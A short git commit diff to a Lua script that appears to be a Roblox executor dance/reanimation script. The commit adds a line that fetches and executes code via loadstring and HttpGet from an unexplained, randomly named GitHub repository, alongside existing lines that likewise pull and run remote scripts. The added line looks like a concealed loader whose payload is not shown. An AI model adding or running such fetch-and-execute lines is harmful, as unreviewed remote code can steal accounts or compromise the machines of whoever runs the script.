dafe44f9b80e2ed205c55de12683607b4f46b247
Solary-3 <atrnatdacc@gmail.com>
2025-07-12 16:12:41 +0800

    Add files via upload

--- KDV3 Theo Version.lua
+++ KDV3 Theo Version.lua
@@ -7,7 +7,7 @@ if not isfile("Dances/Pixelation.mp3") then
 	game:HttpGet("https://github.com/Solary-3/Scripts/blob/Audios-1/Pixelation.mp3?raw=true"))
 	warn("Pixelation Downloaded!")
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Solary-3/Scripts/refs/heads/main/Reanimate.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AstraOutlight/my-scripts/refs/heads/main/namertag"))()
     game:GetService("StarterGui"):SetCore("SendNotification", {
